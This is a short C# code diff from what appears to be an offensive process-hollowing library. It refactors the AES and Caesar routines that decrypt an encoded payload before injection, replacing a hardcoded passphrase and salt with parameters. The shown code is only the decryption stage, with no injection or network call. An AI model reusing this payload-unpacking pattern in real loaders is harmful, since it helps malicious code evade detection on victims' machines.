@@ -9,13 +9,12 @@ namespace ProcessHollowingLib
 {
     public class PFuncs
     {
-        private static byte[] AesDecrypt(byte[] input)
+        private static byte[] AesDecrypt(byte[] input,string password, byte[] iv)
         {
             try
             {
                 var pdb =
-                    new PasswordDeriveBytes("ic34xe!!!", //change this!
-                        new byte[] { 0x67, 0x65, 0x74, 0x66, 0x75, 0x63, 0x6b, 0x65, 0x64 });//change this!
+                    new PasswordDeriveBytes(password, iv);
                 var ms = new MemoryStream();
                 Aes aes = new AesManaged();
                 aes.KeySize = 256;
@@ -35,10 +34,10 @@ namespace ProcessHollowingLib
             }
         }
 
-        public static byte[] CaesarDecrypt(byte[] buffer)
+        public static byte[] CaesarDecrypt(byte[] buffer, string password, byte[] iv)
         {
             Console.WriteLine($"[+] Decrypting AES Payload.");
-            var decrypted = AesDecrypt(buffer);
+            var decrypted = AesDecrypt(buffer, password, iv);
 
             Console.WriteLine($"[+] Decoding Caesar Encoded Payload.");
             var decoded = new byte[decrypted.Length];
